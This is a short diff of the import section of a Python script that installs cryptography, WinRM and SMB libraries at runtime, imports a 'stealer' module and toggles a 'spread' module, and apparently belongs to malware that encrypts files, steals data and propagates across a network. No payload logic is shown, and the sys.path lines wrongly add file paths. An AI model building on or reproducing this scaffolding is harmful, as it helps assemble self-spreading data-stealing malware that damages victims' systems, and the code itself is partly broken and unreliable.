@@ -4,7 +4,8 @@ from time import sleep
 import subprocess
 import sys
 imports = ["cryptography", "pywinrm", "pysmb"]
-
+sys.path.append('./spread.py')
+sys.path.append('./stealer.py')
 # Install necessary modules
 def install(package):
     subprocess.check_call([sys.executable, "-m", "pip", "install", package])
@@ -14,16 +15,10 @@ for module in imports:
 
 # Import necessary modules
 import os
-import ctypes
 import socket
 from datetime import datetime
-import time
 from cryptography.fernet import Fernet
-from ftplib import FTP
-import telnetlib
-import winrm
-from smb.SMBConnection import SMBConnection
-import spread
+#from spread import *
 from stealer import stealer
 #endregion
 
